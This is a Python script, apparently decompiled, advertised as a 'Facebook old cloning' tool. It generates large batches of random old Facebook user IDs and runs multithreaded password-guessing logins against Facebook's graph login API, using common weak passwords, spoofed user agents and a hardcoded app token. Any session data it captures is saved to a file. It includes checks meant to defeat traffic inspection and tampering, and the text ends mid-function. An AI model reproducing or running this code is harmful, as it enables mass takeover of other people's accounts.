# -*- coding: utf-8 -*-
# Decompiled from Python 3.12 bytecode
#ARNOLD XD & RIZWAN &ITZ CHUZA
import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime
import sys

file_name = "res.txt"
sys.stdout.write('\x1b]2; ARNOLD 🔥 \x07')
os.system('pkg install espeak')
# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()


# Initial setup and promotion
os.system('clear')
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx pip install beautifulsoup4')
print('loading Modules ...\n')
os.system('clear')
print(' \x1b[38;5;46mASSALAMUALAIKUM ')
os.system('espeak -a 300 " ASSALAMUALAIKUM"')
print(' \x1b[38;5;46mWELCOME TO ARNOLD TOOL ')
os.system('espeak -a 300 " WELCOME, TO, ARNOLD, TOOL"')


# --- Anti-tampering and Security Checks ---
# The script checks if the source code of the 'requests' library has been modified
# or if packet sniffing tools are being used.
try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass


class sec:
    """
    A security class to detect debugging and packet sniffing tools.
    """
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        # Paths to check for modifications
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        # Check for HTTPCanary (a packet sniffing app)
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        """
        Terminates the script if tampering is detected.
        """
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

# Color codes for terminal output
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'


import random

def windows():
    """
    Generates a random Windows User-Agent string.
    Covers 2010–2025 (Chrome 8 → Chrome 139).
    """
    # Early Chrome (2010–2011, Windows XP/7)
    aV = str(random.choice(range(10, 20)))
    A = (
        f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) "
        f"AppleWebKit/534.{aV} (KHTML, like Gecko) "
        f"Chrome/{str(random.choice(range(8, 15)))}.0.{str(random.choice(range(500, 1200)))}.0 "
        f"Safari/534.{aV}"
    )

    # Mid-era Chrome (2012–2014, Windows 7/8)
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = (
        f"Mozilla/5.0 (Windows NT {str(random.choice(range(6, 7)))}.{str(random.choice(['0', '1', '2']))}) "
        f"AppleWebKit/{bz} (KHTML, like Gecko) "
        f"Chrome/{str(random.choice(range(20, 45)))}.0.{str(random.choice(range(1200, 2800)))}.{str(random.choice(range(1, 150)))} "
        f"Safari/{bz}"
    )

    # Transition era (2015–2017, WOW64 builds)
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = (
        f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['1', '2', '3']))}; WOW64) "
        f"AppleWebKit/{cz} (KHTML, like Gecko) "
        f"Chrome/{str(random.choice(range(45, 70)))}.0.{str(random.choice(range(2800, 5000)))}.{str(random.choice(range(50, 200)))} "
        f"Safari/{cz}"
    )

    # Modern Chrome (2021–2025, Windows 10/11)
    latest_build = random.randint(6000, 9000)
    latest_patch = random.randint(50, 200)
    D = (
        f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{random.choice(range(100, 139))}.0.{latest_build}.{latest_patch} "
        f"Safari/537.36"
    )

    return random.choice([A, B, C, D])


def window11():
    """
    Generates another variant of a random Windows User-Agent string.
    """
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

def window21():
    """
    Generates another variant of a random Windows User-Agent string.
    Covers 2010–2025 era (Chrome 40 to 139).
    Each UA matches realistic year-specific NT and Chrome versions.
    """

    # Old WebKit/Chrome (2010–2013) → Windows 7 + Chrome 40–49
    aV = str(random.choice(range(10, 20)))
    A = (
        f"Mozilla/5.0 (Windows NT 6.1; WOW64) "
        f"AppleWebKit/534.{aV} (KHTML, like Gecko) "
        f"Chrome/{random.choice(range(40, 50))}.0.{random.choice(range(2000, 4000))}.0 "
        f"Safari/534.{aV}"
    )

    # Mid-era Chrome (2014–2016) → Windows 8/8.1 + Chrome 50–69
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f"5{bx}.{bV}"
    B = (
        f"Mozilla/5.0 (Windows NT {random.choice(['6.2', '6.3'])}; WOW64) "
        f"AppleWebKit/{bz} (KHTML, like Gecko) "
        f"Chrome/{random.choice(range(50, 70))}.0.{random.choice(range(3000, 5000))}.{random.choice(range(50, 200))} "
        f"Safari/{bz}"
    )

    # Transition era (2017–2020) → Windows 10 + Chrome 70–89
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f"5{cx}.{cV}"
    C = (
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        f"AppleWebKit/{cz} (KHTML, like Gecko) "
        f"Chrome/{random.choice(range(70, 90))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} "
        f"Safari/{cz}"
    )

    # Modern Chrome (2021–2025) → Windows 10/11 + Chrome 100–139
    latest_build = random.randint(6000, 9000)
    latest_patch = random.randint(100, 200)
    D = (
        f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{random.choice(range(100, 139))}.0.{latest_build}.{latest_patch} "
        f"Safari/537.36"
    )

    return random.choice([A, B, C, D])

import random

def arnold_2008():
    """
    Special: Windows + Early Browsers (2008 era, FB old IDs).
    Covers XP/Vista + IE7/8, Firefox 2/3, Chrome 1–2, Safari 3/4.
    """
    nt = random.choice(["5.1", "6.0"])  # XP, Vista

    # IE7/8
    ie_ver = random.choice(["7.0", "8.0"])
    A = f"Mozilla/4.0 (compatible; MSIE {ie_ver}; Windows NT {nt}; Trident/{'3.1' if ie_ver=='7.0' else '4.0'})"

    # Firefox 2–3
    ff_major = random.choice([2, 3])
    B = f"Mozilla/5.0 (Windows NT {nt}; rv:{ff_major}.0) Gecko/20071127 Firefox/{ff_major}.0"

    # Chrome 1–2
    chrome_ver = f"{random.randint(1,2)}.0.{random.randint(150, 300)}.{random.randint(0,99)}"
    C = f"Mozilla/5.0 (Windows; U; Windows NT {nt}; en-US) AppleWebKit/525.{random.randint(0,20)} " \
        f"(KHTML, like Gecko) Chrome/{chrome_ver} Safari/525.{random.randint(0,20)}"

    # Safari 3–4
    safari_ver = random.choice(["525.26", "528.16"])
    D = f"Mozilla/5.0 (Windows; U; Windows NT {nt}; en-US) AppleWebKit/{safari_ver} (KHTML, like Gecko) " \
        f"Version/{random.choice(['3.2','4.0'])} Safari/{safari_ver}"

    return random.choice([A, B, C, D])


def arnold_1():
    """
    Windows UA (2009–2016).
    Chrome 4–55, Firefox 3–50, IE 8–11.
    """
    chrome_ver = f"{random.randint(4, 55)}.0.{random.randint(200, 4200)}.{random.randint(0, 250)}"
    A = f"Mozilla/5.0 (Windows NT {random.choice(['5.1','6.0','6.1','6.2','6.3'])}; " \
        f"{random.choice(['en-US','en-GB','fr-FR','de-DE'])}) AppleWebKit/537.36 " \
        f"(KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36"

    ff_major = random.randint(3, 50)
    B = f"Mozilla/5.0 (Windows NT {random.choice(['5.1','6.0','6.1','6.2','6.3'])}; rv:{ff_major}.0) " \
        f"Gecko/20100101 Firefox/{ff_major}.0"

    ie_ver = random.choice(["8.0","9.0","10.0","11.0"])
    trident_map = {"8.0":"4.0","9.0":"5.0","10.0":"6.0","11.0":"7.0"}
    C = f"Mozilla/5.0 (compatible; MSIE {ie_ver}; Windows NT {random.choice(['5.1','6.1','6.3'])}; " \
        f"Trident/{trident_map[ie_ver]})"

    return random.choice([A, B, C])


def arnold_2():
    """
    Android UA (2010–2016).
    Popular Samsung, Nexus, HTC, LG, Sony, Micromax.
    """
    android_ver = random.choice([
        "2.3.6","4.0.4","4.1.2","4.2.2","4.3",
        "4.4.2","5.0.2","5.1.1","6.0.1"
    ])
    devices = [
        "GT-I9100","GT-I9300","GT-N7100","GT-I9500","SM-G900F","SM-G920F","SM-N9005",
        "Nexus 4","Nexus 5","Nexus 7","Nexus 10",
        "HTC One X","HTC One M7","HTC One M8",
        "LG-P990","LG-D802","LG-H815",
        "Xperia Z","Xperia Z1","Xperia Z2","Xperia Z3","Xperia Z5",
        "Micromax A110","Micromax A116"
    ]
    device = random.choice(devices)
    chrome_ver = f"{random.randint(18, 55)}.0.{random.randint(800, 4200)}.{random.randint(0, 300)}"

    return f"Mozilla/5.0 (Linux; Android {android_ver}; {device}) " \
           f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Mobile Safari/537.36"


def arnold_3():
    """
    iOS UA (2010–2016).
    iPhone/iPad/iPod Safari builds.
    """
    ios_ver = random.choice([
        "4_3_5","5_1_1","6_1_6","7_1_2","8_4","9_3_5","10_3_3"
    ])
    devices = ["iPhone","iPad","iPod touch"]
    device = random.choice(devices)

    safari_map = {
        "4_3_5": ("533.17.9","5.0"),
        "5_1_1": ("534.46","5.1"),
        "6_1_6": ("536.26","6.0"),
        "7_1_2": ("537.51.2","7.0"),
        "8_4":   ("600.1.4","8.0"),
        "9_3_5": ("601.1","9.0"),
        "10_3_3":("603.3.8","10.0"),
    }
    safari_ver, version_str = safari_map[ios_ver]

    return f"Mozilla/5.0 ({device}; CPU {device} OS {ios_ver} like Mac OS X) " \
           f"AppleWebKit/{safari_ver} (KHTML, like Gecko) Version/{version_str} Mobile/14G60 Safari/{safari_ver}"


def arnold_all():
    """
    Random UA (2008–2016) across Windows, Android, iOS.
    """
    return random.choice([arnold_2008(), arnold_1(), arnold_2(), arnold_3()])

    
def ____banner____():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    print(logo)   
    # Colors (example)
W = '\033[1;37m'  # White
G = '\033[1;32m'  # Green
R = '\033[1;31m'  # Red
Y = '\033[1;33m'  # Yellow
C = '\033[1;36m'  # Cyan
N = '\033[0m'     # Reset

logo = f"""
{W}  █████  ██████  ███    ██  ██████  ██      ██████
{W} ██   ██ ██   ██ ████   ██ ██    ██ ██      ██   ██
{W} ███████ ██████  ██ ██  ██ ██    ██ ██      ██   ██
{G} ██   ██ ██   ██ ██  ██ ██ ██    ██ ██      ██   ██
{G} ██   ██ ██   ██ ██   ████  ██████  ███████ ██████     XD
{C}─────────────────────────────────────────────
{C}| {G}OWNER   {W}: RIZWAN ✅  {W}ARNOLD HARDY xd  {Y}- ISHAN TURK 🌝
{C}| {G}GITHUB  {W}: Rizwanali444
{C}| {G}BESTU   {W}: ITZ CHUZA 🐥 RIZWAN 💥
{C}| {G}VERSION {W}: 4.1
{C}| {G}TOOLS   {W}: FACEBOOK OLD CLONING
{C}| {G}STATUS  {W}: FREE APPROVAL 
{C}| {W}LOGO KA KYA H UNKA TO KAAM HAI HI JALNA 🔥
{C}─────────────────────────────────────────────
{N}"""

print(logo)
#-----------------------------[APPROVAL CHECK]-----------------------------------#

import requests

def creationyear(uid):
    """
    Estimates the Facebook account creation year based on the UID.
    """
    if len(uid) == 15:
        if uid.startswith('1000000000'):
            return '2009'
        if uid.startswith('100000000'):
            return '2009'
        if uid.startswith('10000000'):
            return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
            return '2010'
        if uid.startswith('100001'):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith('10009'):
            return '2023'
        if uid.startswith(('10007', '10008')):
            return '2022'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''


def clear():
    os.system('clear')


def linex():
    print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def BNG_71_():
    """
    Main menu function.
    """
    ____banner____()
    print('\x1b[38;5;226m[\x1b[1;37m1\x1b[38;5;226m]\x1b[38;5;218m2008-2013 CLONE ALL WORKING')
    linex()
    __Jihad__ = input(f"\x1b[38;5;196m[\x1b[1;37m1\x1b[38;5;196m]\x1b[38;5;218mCHOICE{W}: {W}")
    if __Jihad__ in ('A', 'a', '01', '1'):
        old_clone()
    else:
        print(f"\n{rad}Choose Valid Option")
        time.sleep(2)
        BNG_71_()


def old_clone():
    """
    Menu for selecting old account cloning type.
    """
    ____banner____()
    print('\x1b[38;5;197m[\x1b[1;37m1\x1b[38;5;197m]\x1b[38;5;218m2009-2012')
    linex()
    print('\x1b[38;5;197m[\x1b[1;37m2\x1b[38;5;197m]\x1b[38;5;218m2011-2012')
    linex()
    print('\x1b[38;5;197m[\x1b[1;37m3\x1b[38;5;197m]\x1b[38;5;218m2009')
    linex()
    print('\x1b[38;5;197m[\x1b[1;37m4\x1b[38;5;197m]\x1b[38;5;218m2009 STARTING TIME')  
    linex()
    print('\x1b[38;5;197m[\x1b[1;37m5\x1b[38;5;197m]\x1b[38;5;218m2008')  
    linex()
    _input = input(f"\x1b[38;5;197m[\x1b[1;37m🔥\x1b[38;5;197m]\x1b[38;5;218mCHOICE  {W}: {W}")
    if _input in ('A', 'a', '01', '1'):
        old_One()
    elif _input in ('B', 'b', '02', '2'):
        old_Tow()
    elif _input in ('C', 'c', '03', '3'):
        old_Tree()
    elif _input in ('D', 'd', '04', '4'):  
        old_Tree1()
    elif _input in ('E', 'e', '05', '5'):  
        old_Tree12()
    else:
        print(f"\n[×]{rad}Choose Valid Option")
        BNG_71_()


def old_One():
    """
    Cloning method for accounts from 2010-2014.
    """
    user = []
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mOld Code {Y}:{G} 2010-2014")
    ask = input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print('\x1b[38;5;196m[\x1b[1;37m1\x1b[38;5;196m]\x1b[38;5;218mMETHOD 1')
    print('\x1b[38;5;196m[\x1b[1;37m2\x1b[38;5;196m]\x1b[38;5;218mMETHOD 2')
    linex()
    meth = input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mCHOICE {W}(1/2): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for mal in user:
            uid = star + mal
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            else:
                print(f"{rad}[!] INVALID METHOD SELECTED")
                break


def old_Tow():
    """
    Cloning method for accounts with specific prefixes.
    """
    user = []
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mOLD CODE {Y}:{G} 2010-2014")
    ask = input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mSELECT {Y}:{G} ")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print('\x1b[38;5;196m[\x1b[1;37m1\x1b[38;5;196m]\x1b[38;5;218mMETHOD 1')
    print('\x1b[38;5;196m[\x1b[1;37m2\x1b[38;5;196m]\x1b[38;5;218mMETHOD 2')
    linex()
    meth = input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mCHOICE {W}(1/2): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            else:
                print(f"{rad}[!] INVALID METHOD SELECTED")
                break


def old_Tree():
    """
    Cloning method for accounts from 2009-2010.
    """
    user = []
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mOLD CODE {Y}:{G} 2009-2010")
    ask = input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mTOTAL ID COUNT {Y}:{G} ")
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print('\x1b[38;5;196m[\x1b[1;37m1\x1b[38;5;196m]\x1b[38;5;218mMETHOD A')
    print('\x1b[38;5;196m[\x1b[1;37m2\x1b[38;5;196m]\x1b[38;5;218mMethod B')
    linex()
    meth = input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mCHOICE {W}(1/2): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
        print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            else:
                print(f"{rad}[!] INVALID METHOD SELECTED")
                break
import random
from concurrent.futures import ThreadPoolExecutor as tred

def old_Tree1():
    """
    Cloning method for accounts from 2008.
    """
    # Check for required functions and variables
    try:
        ____banner____
        linex
        login_1
        login_2
        Y, G, W, rad
    except NameError as e:
        print(f"\x1b[38;5;196m[!] Error: {e}. Ensure all functions and variables are defined.")
        return

    user = []
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mOLD CODE {Y}:{G} 2009 STARTING TIME ")
    ask = input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    try:
        limit = int(input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mTOTAL ID COUNT {Y}:{G} "))
    except ValueError:
        print(f"{rad}[!] Invalid input. Please enter a number.")
        return
    linex()
    prefix = '1000000'  # Prefix for 2008 Facebook IDs
    for _ in range(limit):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print('\x1b[38;5;196m[\x1b[1;37m1\x1b[38;5;196m]\x1b[38;5;218mMETHOD A')
    print('\x1b[38;5;196m[\x1b[1;37m2\x1b[38;5;196m]\x1b[38;5;218mMethod B')
    linex()
    meth = input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mCHOICE {W}(1/2): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
        print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mUSE AIRPLANE MODE FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            else:
                print(f"{rad}[!] INVALID METHOD SELECTED")
                break
import random
from concurrent.futures import ThreadPoolExecutor as tred

def old_Tree12():
    """
    Cloning method for accounts from 2008 with realistic UID range.
    """
    # Check for required functions and variables
    try:
        ____banner____
        linex
        login_1
        login_2
        Y, G, W, rad
    except NameError as e:
        print(f"\x1b[38;5;196m[!] Error: {e}. Ensure all functions and variables are defined.")
        return

    user = []
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mOLD CODE {Y}:{G} 2008")
    ask = input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    try:
        limit = int(input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mTOTAL ID COUNT {Y}:{G} "))
    except ValueError:
        print(f"{rad}[!] Invalid input. Please enter a number.")
        return
    linex()
    # Realistic 2008 UID range: 50M to 150M (8-9 digits)
    min_id = 50000000  # Approx start of 2008
    max_id = 150000000  # Approx end of 2008
    for _ in range(limit):
        uid = str(random.randint(min_id, max_id)).zfill(9)  # Ensure 9-digit format
        user.append(uid)
    print('\x1b[38;5;196m[\x1b[1;37m1\x1b[38;5;196m]\x1b[38;5;218mMETHOD A')
    print('\x1b[38;5;196m[\x1b[1;37m2\x1b[38;5;196m]\x1b[38;5;218mMethod B')
    linex()
    meth = input(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mCHOICE {W}(1/2): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
        print(f"\x1b[38;5;196m[\x1b[1;37m🔥\x1b[38;5;196m]\x1b[38;5;218mUSE AIRPLANE MODE FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == '1':
                pool.submit(login_1, uid)
            elif meth == '2':
                pool.submit(login_2, uid)
            else:
                print(f"{rad}[!] INVALID METHOD SELECTED")
                break
import requests
import time
import uuid
import os
import sys

def login_1(uid):
    """
    Login attempt method 1 with enhanced cookie capture and saving.
    """
    global loop, oks  # Assuming 'oks' is a global list defined elsewhere
    session = requests.session()
    try:
        sys.stdout.write(
            f"\r\r\x1b[38;5;195m[\x1b[1;37mARNOLD-XD\x1b[38;5;195m]"
            f"\x1b[38;5;196m•\x1b[38;5;192m{loop}\x1b[38;5;195m|\x1b[38;5;195m|"
            f"\x1b[1;37mOK\x1b[38;5;195m|\x1b[38;5;195m|"
            f"\x1b[38;5;192m{len(oks)}"
        )
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': arnold_all(),  
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post(
                'https://b-graph.facebook.com/auth/login',
                data=data,
                headers=headers,
                allow_redirects=False
            ).json()

            # ✅ Successful login with ession key
            if 'session_key' in res:
                print(
                    f"\r\r\x1b[1;37m[ARNOLD-OK]"
                    f"\x1b[1;97m•\x1b[38;5;46m{uid}"
                    f"\x1b[1;97m|\x1b[38;5;46m{pw}"
                    f"\x1b[1;97m|\x1b[38;5;15m{creationyear(uid)}"
                )
                try:
                    with open(file_name, "a", encoding="utf-8") as file:
                        json_string = json.dumps(res, ensure_ascii=False)
                        file.write(f"{uid}|{pw}|{json_string}" + "\n")
                    print(f"Đã lưu nội dung JSON vào file '{file_name}' trên dòng mới.")
                except IOError as e:
